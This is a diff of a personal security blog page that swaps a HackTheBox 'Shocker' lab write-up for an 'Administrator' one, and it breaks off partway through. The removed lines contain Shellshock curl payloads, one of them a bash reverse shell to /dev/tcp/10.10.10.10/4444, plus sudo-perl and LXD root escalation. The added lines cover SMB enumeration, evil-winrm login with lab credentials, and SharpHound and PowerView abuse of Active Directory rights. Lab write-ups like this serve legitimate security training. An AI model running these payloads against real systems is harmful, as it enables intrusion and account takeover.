@@ -30,28 +30,28 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.4.1" />
-<meta property="og:title" content="HackTheBox - Shocker" />
+<meta property="og:title" content="Administrator" />
 <meta name="author" content="S4nity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges." />
-<meta property="og:description" content="Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges." />
-<link rel="canonical" href="http://localhost:4000/posts/Hack-The-Box-Shocker/" />
-<meta property="og:url" content="http://localhost:4000/posts/Hack-The-Box-Shocker/" />
+<meta name="description" content="Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash." />
+<meta property="og:description" content="Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash." />
+<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Administrator/" />
+<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Administrator/" />
 <meta property="og:site_name" content="Sanity-Archive" />
-<meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png" />
+<meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-04-19T13:00:00+02:00" />
+<meta property="article:published_time" content="2025-10-11T13:00:00+02:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png" />
-<meta property="twitter:title" content="HackTheBox - Shocker" />
+<meta property="twitter:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" />
+<meta property="twitter:title" content="Administrator" />
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@S4nity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-04-21T12:29:19+02:00","datePublished":"2025-04-19T13:00:00+02:00","description":"Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.","headline":"HackTheBox - Shocker","image":"https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Hack-The-Box-Shocker/"},"url":"http://localhost:4000/posts/Hack-The-Box-Shocker/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-10-11T13:00:00+02:00","datePublished":"2025-10-11T13:00:00+02:00","description":"Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash.","headline":"Administrator","image":"https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Administrator/"},"url":"http://localhost:4000/posts/HackTheBox-Administrator/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>HackTheBox - Shocker | Sanity-Archive
+  <title>Administrator | Sanity-Archive
   </title>
 
   <!--
@@ -445,7 +445,7 @@
         
           
             
-              <span>HackTheBox - Shocker</span>
+              <span>Administrator</span>
             
 
           
@@ -670,6 +670,69 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -728,28 +791,6 @@
 
       
     
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
 
     
   
@@ -757,38 +798,6 @@
   
   
 
-  
-    
-    
-
-    
-      
-        
-        
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-    
-
-    
   
 
   
@@ -817,9 +826,9 @@
 
 <article class="px-1" data-toc="true">
   <header>
-    <h1 data-toc-skip>HackTheBox - Shocker</h1>
+    <h1 data-toc-skip>Administrator</h1>
     
-      <p class="post-desc fw-light mb-4">Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.</p>
+      <p class="post-desc fw-light mb-4">Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash.</p>
     
 
     <div class="post-meta text-muted">
@@ -836,41 +845,18 @@
 
 <time
   
-  data-ts="1745060400"
+  data-ts="1760180400"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Apr 19, 2025
+  Oct 11, 2025
 </time>
 
       </span>
 
       <!-- lastmod date -->
-      
-        <span>
-          Updated
-          <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1745231359"
-  data-df="ll"
-  
-    data-bs-toggle="tooltip" data-bs-placement="bottom"
-  
->
-  Apr 21, 2025
-</time>
-
-        </span>
       
 
       
@@ -881,7 +867,7 @@
         
 
         <div class="mt-3 mb-3">
-          <a href="https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="popup img-link preview-img shimmer"><img src="https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+          <a href="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" class="popup img-link preview-img shimmer"><img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
       
 
       <div class="d-flex justify-content-between">
@@ -926,9 +912,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="970 words"
+  title="1239 words"
 >
-  <em>5 min</em> read</span>
+  <em>6 min</em> read</span>
 
         </div>
       </div>
@@ -937,7 +923,7 @@
 
   
     <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
-      <span class="label text-truncate">HackTheBox - Shocker</span>
+      <span class="label text-truncate">Administrator</span>
       <button type="button" class="toc-trigger btn me-1">
         <i class="fa-solid fa-list-ul fa-fw"></i>
       </button>
@@ -950,7 +936,7 @@
 
     <dialog id="toc-popup" class="p-0">
       <div class="header d-flex flex-row align-items-center justify-content-between">
-        <div class="label text-truncate py-2 ms-4">HackTheBox - Shocker</div>
+        <div class="label text-truncate py-2 ms-4">Administrator</div>
         <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
           <i class="fas fa-close"></i>
         </button>
@@ -961,7 +947,7 @@
 
   <div class="content">
     <h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>Like always, we do a NMAP scan to see what services are running on the system:</p>
+<p>First we do a nmap scan to see which services are running on the system:</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
@@ -974,26 +960,37 @@
 8
 9
 10
-</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 10.129.15.122
-80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-|_http-title: Site doesn<span class="s1">'t have a title (text/html).
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
-|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
-|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></pre></td></tr></tbody></table></code></div></div>
-<p>The first thing we notice is that SSH is not running on its usual port (22). Its version is also very outdated—as of today (19.04.2025), version 10 is the current one. SSH is generally unlikely to be directly exploitable, but we’ll note it down in case it becomes relevant later.</p>
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap.txt 10.129.95.15
 
-<p>Visiting the website presents us with only the following image:</p>
+21/tcp   open  ftp           Microsoft ftpd
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-10-09 19:35:35Z<span class="o">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<p><a href="/post-images/shellshock/index.png" class="popup img-link  shimmer"><img src="/post-images/shellshock/index.png" alt="index screenshot" loading="lazy"></a></p>
-
-<p>Reviewing the source code doesn’t give us anything useful either:</p>
-<div class="language-html highlighter-rouge"><div class="code-header">
-        <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span>
+<p>We can see that FTP (Port 21), DNS (Port 53), Kerberos(Port 88) LDAP (Port 389), SMB (Port 445/139), and WinRM (Port 5985) are open.
+It appears to be a DC.
+<br />
+Next we test if we are able to connect to FTP, with either Anonymous or the credentials we received on starting the machine (Olivia:ichliebedich).
+Unfortunately neither of them work.
+<br />
+Afterwards we use NetExec to enumerate the SMB shares:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -1003,20 +1000,64 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 7
 8
 9
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-
-<span class="nt">&lt;h2&gt;</span>Don't Bug Me!<span class="nt">&lt;/h2&gt;</span>
-<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"bug.jpg"</span> <span class="na">alt=</span><span class="s">"bug"</span> <span class="na">style=</span><span class="s">"width:450px;height:350px;"</span><span class="nt">&gt;</span>
-
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span> 
+10
+11
+</pre></td><td class="rouge-code"><pre>nxc smb 10.129.95.15 <span class="nt">-u</span> Olivia <span class="nt">-p</span> <span class="s1">'ichliebedich'</span> <span class="nt">--shares</span>
+SMB         10.129.95.15    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.95.15    445    DC               <span class="o">[</span>+] administrator.htb<span class="se">\O</span>livia:ichliebedich 
+SMB         10.129.95.15    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
+SMB         10.129.95.15    445    DC               Share           Permissions     Remark
+SMB         10.129.95.15    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.129.95.15    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.129.95.15    445    DC               C<span class="nv">$ </span>                             Default share
+SMB         10.129.95.15    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.129.95.15    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.95.15    445    DC               SYSVOL          READ            Logon server share
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Running a quick directory busting scan reveals something interesting: the /cgi-bin/ directory, which can be a great attack vector if we find a script inside it.</p>
-<blockquote class="prompt-tip">
-  <p>-ic = ignore comments</p>
+<p>It doesn’t appear to be bountiful at first glance, which is why we move on to gather more information from inside the system.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Olivia <span class="nt">-p</span> <span class="s1">'ichliebedich'</span>
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Next we use SharpHound (Version 1.1.1), which we can get from GitHub. We can up-&amp;download files from and to the directory we are in via Evil-WinRM.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; upload SharpHound.zip
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; Expand-Archive .<span class="se">\S</span>harpHound.zip
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>SharpHound
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; download .<span class="se">\2</span>0251009184223_BloodHound.zip
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Then we import the Zip-file to Bloodhound.<br />
+If we search for Olivia we can see, that she has an outbound object control of “GenericAll” over Michael, who has “ForceChangePassword” control over Benjamin.</p>
+
+<p><a href="/post-images/administrator/bloodhound_initial.jpg" class="popup img-link  shimmer"><img src="/post-images/administrator/bloodhound_initial.jpg" alt="Bloodhound initial screenshot" loading="lazy"></a></p>
+
+<p>Next we navigate to C:\programdata and create a share directory, so that we can access files with other user accounts as well and upload powerview.ps1 into it.</p>
+<blockquote class="prompt-info">
+  <p>powerview.ps1 comes pre-installed with Kali, to find it use: “locate powerview”, else download it from GitHub.</p>
 </blockquote>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
@@ -1028,161 +1069,259 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 5
 6
 7
-</pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ <span class="nt">-u</span> http://10.129.15.122/FUZZ <span class="nt">-ic</span>
-.hta                    <span class="o">[</span>Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 34ms]
-.htpasswd               <span class="o">[</span>Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 34ms]
-.htaccess               <span class="o">[</span>Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 43ms]
-cgi-bin/                <span class="o">[</span>Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 17ms]
-index.html              <span class="o">[</span>Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 21ms]
-server-status           <span class="o">[</span>Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 14ms]
+</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">mkdir </span>share
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">cd </span>share
+&lt;...&gt;
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; upload powerview.ps1
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>The initial NMAP scan showed us that the machine is running on Linux.
-This knowledge helps us decide on what file extensions to hunt for. Fuzzing for shell scripts gives us a hit:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-</pre></td><td class="rouge-code"><pre>ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ <span class="nt">-u</span> http://10.129.15.122/cgi-bin/FUZZ.sh <span class="nt">-ic</span>
-.htaccess               <span class="o">[</span>Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 14ms]
-.hta                    <span class="o">[</span>Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 28ms]
-.htpasswd               <span class="o">[</span>Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 28ms]
-user                    <span class="o">[</span>Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 24ms]
-</pre></td></tr></tbody></table></code></div></div>
-<h2 id="gaining-a-foothold"><span class="me-2">Gaining a foothold</span><a href="#gaining-a-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<p>In our NMAP scan, we saw that OpenSSH wasn’t up to date, which could indicate that other services and applications might also be outdated.
-Shellshock, also known as the “Bash Bug” (<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE-2014-6271</a>), is a well-known exploit targeting CGI applications,
-where an attacker sends malicious code in the User-Agent header, which the server then executes.
-First, we run a small command to see if it works:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'"</span> http://10.129.15.122/cgi-bin/user.sh
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>It worked! Now we can try to get a reverse shell going. In our first terminal window we start our NetCat listener like so:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 4444
-</pre></td></tr></tbody></table></code></div></div>
-<p>In a second window we try to get our payload going:</p>
-<blockquote class="prompt-warning">
-  <p>remember to change 10.10.10.10 to your IP!</p>
-</blockquote>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1'"</span> http://10.129.15.122/cgi-bin/user.sh
-</pre></td></tr></tbody></table></code></div></div>
-<p>After gaining a shell, we upgrade it to an interactive one. To see how it’s done, check out my guide <a href="/posts/Interactive-Shell-Guide">here</a>.</p>
-
-<h2 id="escalating-our-privileges"><span class="me-2">Escalating our privileges</span><a href="#escalating-our-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
-<h3 id="method-1-sudo-perl-shell"><span class="me-2">Method 1: Sudo Perl Shell</span><a href="#method-1-sudo-perl-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-<p>The first method we can use to escalate our privileges can be detected by running sudo -l:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo</span> <span class="nt">-l</span>
-Matching Defaults entries <span class="k">for </span>shelly on Shocker:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User shelly may run the following commands on Shocker:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
-</pre></td></tr></tbody></table></code></div></div>
-<p>The output shows us that we can run /usr/bin/perl as root without specifying our password.
-This allows us to get a perl shell directly as root:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>perl <span class="nt">-e</span> <span class="s1">'exec "/bin/bash"'</span>
-root@Shocker:/usr/lib/cgi-bin# <span class="nb">whoami
-</span>root
-</pre></td></tr></tbody></table></code></div></div>
-<h3 id="method2-abusing-the-lxd-group"><span class="me-2">Method2: Abusing the LXD Group</span><a href="#method2-abusing-the-lxd-group" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
-<p>In our first curl we got the following output:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>shelly<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>This shows us that our current user is part of the LXD group. Members of the LXD group are allowed to configure containers.
-To abuse this privilege, we need to set up a new container in which we have root privileges, allowing us to access everything on the system.
-First, we need to get an image of an operating system. In this case, we use Alpine, which is a super lightweight version of Linux:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>git clone https://github.com/saghul/lxd-alpine-builder.git
-<span class="nb">cd </span>lxd-alpine-builder
-<span class="nb">sudo</span> ./build-alpine
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Afterwards we need to transfer the file to our target machine, which we can do like this:</p>
-<blockquote class="prompt-warning">
-  <p>Remember to change 10.10.10.10 to your IP and the file name if necessary!</p>
-</blockquote>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server 80
-curl <span class="nt">-o</span> alpine.tar.gz http://10.10.10.10/alpine-v3.10-x86_64-20191008_1227.tar.gz
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Next we should check our home directory. If no home directory is set up or we don’t have writing permissions in it,
-we’d be unable to setup the container.</p>
+<p>We can use our GenericAll control over Michael to force change their password via PowerView.</p>
 
 <blockquote class="prompt-danger">
-  <p>If you change the home directory in a pentest note it down and either revert it or notify the customer afterwards, so your attack doesn’t cause havoc.</p>
+  <p>We should never use bad passwords like this in a real world environment!</p>
 </blockquote>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="nv">$HOME</span>
-<span class="c"># it doesn't return anything, so no home directory is set up</span>
-<span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/tmp <span class="c"># sets our home directory to /tmp</span>
-</pre></td></tr></tbody></table></code></div></div>
 
-<p>Now we can import the image into our LXC storage and initialize it in privileged mode, which grants us full root permissions within the container.</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
